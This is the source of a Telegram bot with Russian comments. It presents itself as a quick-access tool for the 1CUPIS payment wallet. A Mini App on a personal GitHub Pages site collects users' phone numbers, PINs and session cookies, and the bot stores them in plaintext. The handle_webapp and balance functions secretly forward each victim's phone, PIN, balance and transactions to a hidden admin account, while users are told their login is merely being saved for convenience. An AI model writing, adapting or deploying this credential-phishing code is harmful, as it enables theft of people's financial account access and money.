# bot.py
import json
import logging
import sqlite3
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from bs4 import BeautifulSoup
import requests

# === Настройки ===
TOKEN = ""  # ← ВСТАВЬ СВОЙ
ADMIN_ID = 123456789  # ← ВСТАВЬ ID АДМИНА
WEBAPP_URL = "https://art3vil.github.io/cupis/" # ← ТВОЯ ССЫЛКА

# === Логи ===
logging.basicConfig(level=logging.INFO)

# === БД ===
DB = "users.db"


def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            phone TEXT,
            pin TEXT,
            cookies TEXT,
            updated_at TEXT
        )
    ''')
    conn.commit()
    conn.close()


# === Сохранение/чтение ===
def save_user(chat_id, username, phone, pin, cookies):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users 
        (chat_id, username, phone, pin, cookies, updated_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (
        chat_id,
        username,
        phone,
        pin,
        cookies,
        datetime.now().isoformat()
    ))
    conn.commit()
    conn.close()


def get_user(chat_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, pin, cookies FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        phone, pin, cookies = row
        return {
            'phone': phone,
            'pin': pin,
            'cookies': cookies
        }
    return None


# === Авторизация через API ===
def login_with_credentials(phone, pin):
    """Авторизация на сайте через телефон и PIN"""
    try:
        session = requests.Session()

        # Получаем страницу авторизации для получения CSRF токена
        login_page = session.get("https://wallet.1cupis.ru/", timeout=10)
        soup = BeautifulSoup(login_page.text, 'html.parser')

        # Пробуем найти форму авторизации и отправить данные
        # Это примерный код - нужно адаптировать под реальный API сайта
        login_data = {
            'phone': phone,
            'pin': pin,
        }

        # Попытка авторизации (адаптируй под реальный endpoint)
        response = session.post(
            "https://wallet.1cupis.ru/api/login",  # Замени на реальный URL
            data=login_data,
            timeout=10,
            allow_redirects=True
        )

        # Если авторизация успешна, возвращаем cookies
        if response.status_code == 200 or 'кабинет' in response.url.lower():
            cookies_str = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
            return cookies_str

        return None
    except Exception as e:
        logging.error(f"Ошибка авторизации: {e}")
        return None


# === Парсинг баланса ===
def get_balance_with_session(cookies_str=None, phone=None, pin=None):
    """
    Получает баланс через cookies или авторизуется через API
    """
    try:
        session = requests.Session()

        # Если cookies предоставлены, используем их
        if cookies_str and cookies_str.strip():
            cookies = {}
            for item in cookies_str.split('; '):
                if '=' in item:
                    k, v = item.split('=', 1)
                    cookies[k] = v
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.1cupis.ru')
        # Если cookies нет, но есть телефон и PIN, авторизуемся
        elif phone and pin:
            cookies_str = login_with_credentials(phone, pin)
            if not cookies_str:
                return None  # Авторизация не удалась
            # Парсим полученные cookies
            cookies = {}
            for item in cookies_str.split('; '):
                if '=' in item:
                    k, v = item.split('=', 1)
                    cookies[k] = v
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.1cupis.ru')
        else:
            return None

        # Получаем страницу кабинета
        response = session.get("https://wallet.1cupis.ru/cabinet", timeout=10)
        if "авторизация" in response.text.lower() or response.status_code == 401:
            return None  # Сессия устарела или не авторизован

        soup = BeautifulSoup(response.text, 'html.parser')

        # Ищем баланс (адаптируй под реальный HTML)
        balance_elem = soup.find(string=lambda t: '₽' in t and len(t) < 50)
        balance = balance_elem.strip() if balance_elem else "Не найдено"

        # Транзакции
        transactions = []
        for row in soup.select("tr, .transaction, .operation")[:5]:
            text = row.get_text(strip=True)
            if text and len(text) < 200:
                transactions.append(text)

        return {
            'balance': balance,
            'transactions': transactions
        }
    except Exception as e:
        logging.error(f"Ошибка получения баланса: {e}")
        return None


# === Команды ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [[InlineKeyboardButton(
        "Открыть 1CUPIS",
        web_app=WebAppInfo(url=WEBAPP_URL)
    )]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"Привет, {user.first_name}!\n"
        "Нажмите кнопку, чтобы войти в 1CUPIS через Mini App.\n"
        "Мы сохраним ваш вход для быстрого доступа.",
        reply_markup=reply_markup
    )


async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await update.message.reply_text("Вы не авторизованы. Используйте /start")
        return

    await update.message.reply_text("Проверяю баланс...")

    # Пробуем получить баланс через cookies или через авторизацию
    data = get_balance_with_session(
        cookies_str=user_data.get('cookies'),
        phone=user_data.get('phone'),
        pin=user_data.get('pin')
    )
    if not data:
        await update.message.reply_text("Не удалось получить баланс. Проверьте данные и попробуйте снова: /start")
        return

    msg = f"**ВАШ БАЛАНС**\n\n"
    msg += f"**Баланс:** {data['balance']}\n\n"
    if data['transactions']:
        msg += "**Последние операции:**\n"
        for t in data['transactions']:
            msg += f"• {t}\n"
    else:
        msg += "Операций нет."

    # Отправляем пользователю
    await update.message.reply_text(msg, parse_mode='Markdown')

    # Дублируем админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"**БАЛАНС ПОЛЬЗОВАТЕЛЯ**\n"
                 f"ID: {update.effective_user.id}\n"
                 f"Имя: {update.effective_user.first_name}\n"
                 f"Телефон: {user_data['phone']}\n\n{msg}",
            parse_mode='Markdown'
        )
    except:
        pass  # Админ заблокировал бота


# === Обработка Mini App ===
async def handle_webapp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.web_app_data or not update.web_app_data.data:
        return

    try:
        data = json.loads(update.web_app_data.data)
        if data.get('action') != 'save_auth':
            return

        chat_id = update.effective_user.id
        username = update.effective_user.username or update.effective_user.first_name
        phone = data['phone']
        pin = data['pin']
        cookies = data['cookies']

        save_user(chat_id, username, phone, pin, cookies)

        await update.message.reply_text(
            "Вход сохранён!\n"
            f"Номер: `{phone}`\n"
            f"PIN: `{pin}`\n\n"
            "Теперь используйте /balance",
            parse_mode='Markdown'
        )

        # Уведомляем админа
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"**НОВЫЙ ВХОД**\n"
                 f"ID: {chat_id}\n"
                 f"Имя: {username}\n"
                 f"Телефон: {phone}\n"
                 f"PIN: {pin}\n"
                 f"Время: {datetime.now().strftime('%H:%M %d.%m')}",
            parse_mode='Markdown'
        )

    except Exception as e:
        await update.message.reply_text(f"Ошибка: {e}")


# === Запуск ===
if __name__ == "__main__":
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp))

    print("Бот запущен...")
    app.run_polling()